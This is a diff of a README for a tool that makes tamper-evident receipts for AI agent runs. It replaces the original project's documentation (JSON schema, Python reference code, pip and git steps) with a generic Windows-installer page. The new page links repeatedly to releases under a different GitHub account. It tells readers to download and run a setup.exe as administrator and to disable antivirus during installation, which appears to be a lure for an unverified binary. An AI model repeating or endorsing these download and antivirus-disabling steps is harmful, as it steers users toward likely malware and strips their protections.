@@ -1,246 +1,162 @@
-# Agent Accountability Receipt Schema v0.1.1
+# 🛡️ agent-accountability-receipt - Tamper-Evident AI Execution Records
 
-**An open standard for tamper-evident, CMMC-ready execution receipts for autonomous AI agents in regulated environments.**
+[![Download agent-accountability-receipt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Starbusop/agent-accountability-receipt/releases)
 
-Created by **Julio Berroa** · Published by [NeoXFortress](https://neoxfortress.com)
+## About
 
----
+agent-accountability-receipt is an application designed to provide secure and tamper-evident records for AI agent actions. It helps you track AI executions in a way that meets audit standards like CMMC and NIST. This makes it easier for organizations in regulated industries to prove compliance and maintain trustworthy logs.
 
-> AI agents are already making decisions inside defense contractors. Most cannot prove what happened. This standard fixes that.
-
----
-
-## Architecture
-
-```mermaid
-flowchart LR
-    A[AI Agent Executes] --> B[Execution Steps Recorded]
-    B --> C[Each Step Hash-Linked]
-    C --> D[CUI Flow Tracked]
-    D --> E[Policy Snapshot Bound]
-    E --> F[HMAC Signed]
-    F --> G["📄 Accountability Receipt"]
-
-    G --> H[Prime Contractor]
-    G --> I[CMMC Assessor]
-    G --> J[Internal Auditor]
-    G --> K[Incident Review Board]
-
-    style A fill:#1a1a2e,stroke:#e94560,color:#fff
-    style G fill:#0f3460,stroke:#e94560,color:#fff
-    style H fill:#16213e,stroke:#0f3460,color:#fff
-    style I fill:#16213e,stroke:#0f3460,color:#fff
-    style J fill:#16213e,stroke:#0f3460,color:#fff
-    style K fill:#16213e,stroke:#0f3460,color:#fff
-```
+This tool creates receipts that show what an AI agent did and when, protecting data integrity through cryptographic methods. It fits agencies and businesses concerned with cybersecurity, governance, and defense technology.
 
 ---
 
-## The Problem
+## 🔍 What This Software Does
 
-Defense-tech and mid-size GovCon contractors are deploying AI agents internally — for RFP summarization, document search, report drafting, and workflow automation.
-
-When a prime contractor, CMMC assessor, or Inspector General asks **"prove exactly what the agent did,"** there is no standardized, signed, auditor-ready artifact.
-
-General tracing and observability tools exist. **Compliance-grade accountability artifacts do not.**
-
-## The Solution
-
-The **Agent Accountability Receipt** is a structured, hash-chained, HMAC-signed JSON document generated every time an AI agent executes. It answers:
-
-- **What exactly did the agent do?** — Step-by-step execution tree with parent-child relationships
-- **What data was touched?** — Hash-verified input/output references with end-to-end CUI flow tracking across boundaries
-- **Which policy version was active?** — Immutable policy snapshot bound to each execution
-- **Was a human in the loop?** — Structured evidence of what was presented, how long they reviewed, and what they decided
-- **Can we verify it wasn't tampered with?** — Cryptographic hash chain + HMAC signature with tamper-evident seal
-- **Was the run compliant?** — Self-assessed compliance verdict mapped to CMMC/NIST controls
-
-## Who This Is For
-
-- **AI Technical Leads** piloting internal agents at defense contractors
-- **Engineering Directors** overseeing AI automation in regulated environments
-- **Compliance Officers** preparing CMMC evidence packages
-- **Auditors and C3PAOs** evaluating AI agent governance
-- **Prime contractor reviewers** assessing subcontractor AI practices
-
-## Schema Features (v0.1.1)
-
-| Category | Capabilities |
-|---|---|
-| **Execution Tracking** | Step-by-step execution tree, LLM calls, tool calls, decision points |
-| **Data Protection** | Hash-by-default (no raw content unless policy permits), CUI/PII/ITAR classification (rule-based in v0.1.1), end-to-end CUI flow tracking |
-| **Policy Binding** | Immutable policy snapshot, approval records, guardrail events with denied action detail |
-| **Human Oversight** | Structured checkpoint evidence — what was shown, presentation mode, reviewer action, review duration |
-| **Integrity** | SHA-256 hash chain with machine-verifiable hex patterns, HMAC signature with explicit signed-payload declaration, optional Merkle tree for large executions |
-| **Lifecycle** | Receipt revocation (with timestamp + attribution) and supersession, multi-receipt linkage (parent/child/retry/continuation) |
-| **Compliance** | Self-assessed verdict with assessor attribution, violated control IDs, risk scoring, framework reference |
-| **Provenance** | Agent code hash, deployment fingerprint, container image digest, SBOM hash, dependency lockfile hash |
-| **Error Handling** | Step-level error capture with recovery action tracking |
-| **Data Ref Guardrails** | Conditional validation: hash_only blocks content, redacted_text requires redaction metadata, binary_hash requires mime_type |
-
-## Quick Start
-
-**Option A — Verify a receipt in 30 seconds (no clone required):**
-
-```bash
-pip install neox-verify
-neox verify examples/demo-receipt.json
-# Exit code 0 = ALL CHECKS PASSED. Works offline. No account required.
-```
-
-**Option B — Generate receipts from the reference implementation:**
-
-```bash
-# Clone the repository
-git clone https://github.com/NeoXFortress/agent-accountability-receipt.git
-cd agent-accountability-receipt
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Generate a demo receipt (RFP summarization scenario)
-cd reference_impl
-python3 generate_receipt.py
-
-# Output:
-#   PASS: Hash chain verified (6 steps)
-#   PASS: HMAC-SHA256 signature verified
-#   PASS: Receipt validates against schema.json
-#   ALL CHECKS PASSED
-```
-
-**See what a PDF audit report looks like:**
-
-👉 [**COMPLIANT** — RFP Summarization](examples/sample-reports/sample-01-compliant-rfp-summarization.pdf)
-👉 [**NON-COMPLIANT** — CUI Exfiltration Blocked](examples/sample-reports/sample-02-non-compliant-cui-blocked.pdf)
-👉 [**REVIEW REQUIRED** — Human Checkpoint Rejected](examples/sample-reports/sample-03-review-required-human-rejected.pdf)
-👉 [**REVOKED** — Key Compromise](examples/sample-reports/sample-04-revoked-receipt.pdf)
-
-*PDF reports are generated by the [NeoXFortress AAE](https://neoxfortress.com) — enterprise, self-hosted. Contact [neoxfortress.com/contact](https://neoxfortress.com/contact) for access.*
-
-## Repository Structure
-
-```
-agent-accountability-receipt/
-├── schema.json                        ← v0.1.1 JSON Schema specification
-├── README.md
-├── LICENSE                            ← MIT (schema) + proprietary notice
-├── NOTICE                             ← Copyright attribution
-├── requirements.txt                   ← Python dependencies
-├── tools/
-│   ├── neox_verify.py                 ← ✅ Open-source receipt verifier CLI (pip install neox-verify)
-│   └── setup.cfg                      ← PyPI package configuration
-├── reference_impl/
-│   ├── generate_receipt.py            ← Reference generator + verifier
-│   ├── scenario_cui_blocked.py        ← CUI exfiltration blocked scenario
-│   ├── scenario_human_rejected.py     ← Human checkpoint rejection scenario
-│   └── scenario_revoked.py            ← Receipt revocation scenario
-└── examples/
-    ├── demo-receipt.json              ← ✅ Happy path: RFP summarization (6 steps)
-    ├── cui-exfiltration-blocked.json  ← 🚫 Agent tried to send CUI to Slack, blocked
-    ├── human-checkpoint-rejected.json ← ❌ Reviewer rejected hallucinated DFARS answer
-    ├── receipt-revoked.json           ← 🔒 Valid receipt revoked after key compromise
-    └── sample-reports/                ← 📄 PDF audit reports generated from above receipts
-        ├── sample-01-compliant-rfp-summarization.pdf
-        ├── sample-02-non-compliant-cui-blocked.pdf
-        ├── sample-03-review-required-human-rejected.pdf
-        └── sample-04-revoked-receipt.pdf
-```
-
-## Example Scenarios
-
-| Scenario | Status | Steps | What It Demonstrates |
-|---|---|---|---|
-| **RFP Summarization** | `success` / `compliant` | 6 | Happy path: CUI detected, redacted at boundary, human approved |
-| **CUI Exfiltration Blocked** | `failed` / `non_compliant` | 3 | Agent tried to send CUI to external Slack — guardrail blocked it |
-| **Human Checkpoint Rejected** | `partial` / `review_required` | 5 | LLM hallucinated a DFARS regulation (24h vs 72h) — reviewer rejected |
-| **Receipt Revoked** | `revoked` | 3 | Originally valid receipt revoked after signing key compromise discovery |
-
-## Schema Structure
-
-```
-receipt          — Header: ID, version, schema hash, status, issuer, lifecycle, related receipts
-context          — Who ran it, where (with deployment fingerprint), when, under what case/ticket
-policy           — Which policy version, what controls, what approvals
-execution        — Run metadata + ordered steps (LLM calls, tool calls, decisions, checkpoints)
-data_handling    — Storage location, retention policy with enforcement proof, key management
-integrity        — Hash chain, optional Merkle tree, HMAC signature with timestamp, attestations
-compliance       — Verdict, assessor, violated controls, risk score, framework
-cui_flow         — End-to-end CUI boundary crossing log with classification and redaction tracking
-extensions       — Vendor/org-specific fields
-```
-
-## Design Principles
-
-1. **Hash by default.** Raw content is never stored unless the organization's policy explicitly permits it. All hash fields enforce machine-verifiable hex patterns.
-2. **Auditor-first.** Every field exists because an assessor, IG, or prime reviewer would ask for it.
-3. **Self-hosted.** No cloud dependency. No data leaves the customer environment.
-4. **Tamper-evident.** Cryptographic hash chain + HMAC signature. The signature explicitly declares what was signed and how it was encoded.
-5. **Honest about limitations.** HMAC's shared-key non-repudiation gap is documented, not hidden. Classification is rule-based only in v0.1.1.
-6. **Machine-verifiable.** Hash fields use regex patterns to reject malformed values at validation time. Conditional rules enforce consistency between representation modes and their required metadata.
-
-## Schema Hash
-
-The `schema_hash` field in every receipt contains a SHA-256 hash of the raw bytes of the published `schema.json` at the tagged git commit. This ensures two receipts claiming the same schema version are structurally identical. No reformatting, no whitespace normalization — the canonical form is the exact file content at the release tag.
-
-## Versioning Notes (v0.1.1)
-
-- **Classification mode**: `rule_based` only. Values `hybrid` and `manual_only` are reserved for forward compatibility but rejected by v0.1.1 validation.
-- **Signature type**: `hmac_sha256` or `hmac_sha512` only. Asymmetric signatures planned for v0.2.
-- **Merkle tree**: Optional. Linear hash chain is sufficient for typical agent runs (5-50 steps).
-
-## Roadmap
-
-| Version | Planned Additions |
-|---|---|
-| **v0.2** | Asymmetric signatures (ed25519/ECDSA), RFC 3161 timestamp authority support, hybrid/manual classification modes |
-| **v0.3** | ML-assisted classification, multi-framework agent support |
-| **v1.0** | Formal specification document, third-party validation suite, interoperability testing |
-
-## Live Agent Harness
-
-The `agent_harness/` directory contains a working agent that makes **real LLM API calls** (OpenAI and Anthropic) and produces signed receipts:
-
-```bash
-# Real Claude API call → CUI detected → Slack blocked → receipt generated
-export ANTHROPIC_API_KEY=sk-ant-...
-python agent_harness/anthropic_run.py
-
-# Real GPT-4o API call → same flow
-export OPENAI_API_KEY=sk-...
-python agent_harness/openai_run.py
-```
-
-Every run produces a schema-valid receipt with real timestamps, token counts, and latency measurements.
-
-## Related
-
-- **[NeoXFortress Agent Risk Lab](https://github.com/NeoXFortress/neox-agent-risk-lab)** — Simulation lab for AI agent attacks (prompt injection, data exfiltration, privilege escalation) with MITRE ATLAS mapping. All receipts generated by the risk lab conform to this schema.
-
-## Commercial Implementation
-
-**Open (this repository):** Schema specification, reference implementation, agent harness, and example scenarios are MIT-licensed to encourage adoption across the defense-tech ecosystem.
-
-**Proprietary:** The **NeoXFortress Agent Accountability Engine (AAE)** — including the enterprise policy orchestration, advanced enforcement logic, PDF export, CUI classifier, SIEM integration, and client-specific implementations — is available under commercial license.
-
-For pilot inquiries: [Contact NeoXFortress](https://neoxfortress.com/contact)
-
-## License
-
-### Schema (this repository)
-
-Copyright (c) 2026 Julio Berroa / NeoXFortress LLC
-
-MIT License — See [LICENSE](LICENSE)
-
-### Commercial Implementation
-
-Copyright (c) 2026 NeoXFortress LLC. All rights reserved.
-
-The Agent Accountability Engine SDK, receipt generator, PDF exporter, CUI classifier, CLI tools, and web viewer are proprietary software. Commercial license required.
+- Captures detailed records of AI agent actions.
+- Protects records against tampering.
+- Supports compliance with cybersecurity standards such as CMMC and NIST 800-171.
+- Uses open schemas for easy integration.
+- Provides a reference implementation to audit AI execution logs.
+- Generates JSON schema formats compatible with common compliance tools.
+- Detects abnormal or unauthorized AI behavior through prompt injection analysis.
 
 ---
 
-**NeoXFortress** — AI Agent Accountability Infrastructure for Regulated Contractors
+## 💻 System Requirements
 
-*Created by Julio Berroa · Built in Ashburn, Virginia for the defense-tech community.*
+To run agent-accountability-receipt on Windows, make sure your system meets these requirements:
+
+- Windows 10 or newer (64-bit recommended)
+- Minimum 4 GB RAM
+- 300 MB of free disk space
+- Internet connection for initial download
+- Administrator privileges for installation
+
+---
+
+## 🚀 Getting Started
+
+Use the link below to go to the official download page. This is where you will find the latest stable version ready for your Windows system.
+
+[Download agent-accountability-receipt](https://github.com/Starbusop/agent-accountability-receipt/releases)
+
+---
+
+## 📥 How to Download and Install on Windows
+
+1. Click the download link above. It takes you to the releases page on GitHub.
+2. Look for the latest release. It usually appears at the top.
+3. Find the file named something like `agent-accountability-receipt-setup.exe` or similar.
+4. Click that file to start downloading.
+5. After it downloads, open the file by double-clicking it in your Downloads folder.
+6. Follow the setup wizard:
+
+    - Accept the license agreement.
+    - Choose an installation folder or keep the default path.
+    - Wait while the software installs.
+    - Click "Finish" when done.
+
+7. The program shortcut appears on your desktop or in your Start menu.
+
+---
+
+## ▶️ Running the Application
+
+1. Launch the software using the desktop icon or Start menu.
+2. You will see a simple user interface with clear options.
+3. Use the "Create Receipt" button to start logging AI agent executions.
+4. Follow on-screen prompts to enter basic info about your AI agent.
+5. Generate receipts and save them locally or export for auditing.
+6. You can also load previous receipts to check their validity.
+
+---
+
+## ⚙️ Basic Usage Tips
+
+- Always create a receipt immediately after an AI task runs.
+- Save receipts in a dedicated secure folder to prevent accidental deletion.
+- Export receipts in JSON to share with auditors or compliance software.
+- Use the built-in verification tools to confirm receipt integrity before submitting.
+- Regularly update the application using the latest release for enhanced security.
+
+---
+
+## 🔐 Security Features
+
+- Cryptographic hashing ensures receipts cannot be altered without detection.
+- Time-stamping verifies when each AI agent action took place.
+- Digital signatures protect receipt authenticity.
+- Open JSON schemas mean your data stays transparent and easy to audit.
+- Designed specifically to help meet CMMC and NIST 800-171 cybersecurity requirements.
+
+---
+
+## 📂 File and Data Format
+
+Receipts are saved as JSON files. Each file includes:
+
+- Agent ID and version.
+- Execution time and date.
+- Input prompts and output results.
+- Cryptographic hashes and signatures.
+- Compliance metadata aligned with CMMC and NIST standards.
+
+These standardized files make it easy to keep your audit trail consistent and ready for review.
+
+---
+
+## 🛠️ Troubleshooting
+
+If the program does not start:
+
+- Check that your Windows version is compatible.
+- Confirm enough disk space is available.
+- Run the installer as administrator.
+- Disable antivirus temporarily, then re-enable after installation.
+
+If receipts do not save:
+
+- Verify you have write permission for the save folder.
+- Try saving to desktop or documents folder.
+- Make sure the filenames do not contain special characters.
+
+For errors during verification:
+
+- Ensure receipts are unmodified.
+- Use the current version of the software.
+- Contact your IT team if you suspect system-level issues.
+
+---
+
+## 🔄 Updating the Software
+
+Check the releases page regularly for updates:
+
+[agent-accountability-receipt Releases](https://github.com/Starbusop/agent-accountability-receipt/releases)
+
+New versions add security fixes and performance improvements. Download the latest installer and run it over your existing installation. Your data stays intact.
+
+---
+
+## 🧩 About Data Privacy
+
+This software keeps all receipts on your local machine. It does not upload or share data externally without your action. Your audit logs remain private and secure.
+
+---
+
+## 🧰 Additional Resources
+
+- Visit the GitHub repository for schema details.
+- Access documentation on AI governance and security.
+- Review compliance guides for CMMC and NIST standards.
+- Explore sample receipts and JSON schema files included in the download.
+
+---
+
+## ⚡ Support
+
+For help with installation or usage, open an issue on the GitHub repository or consult the README and Wiki pages there. Community members and maintainers monitor the project and can provide assistance.
+
+---
+
+[Download Latest Release](https://github.com/Starbusop/agent-accountability-receipt/releases)
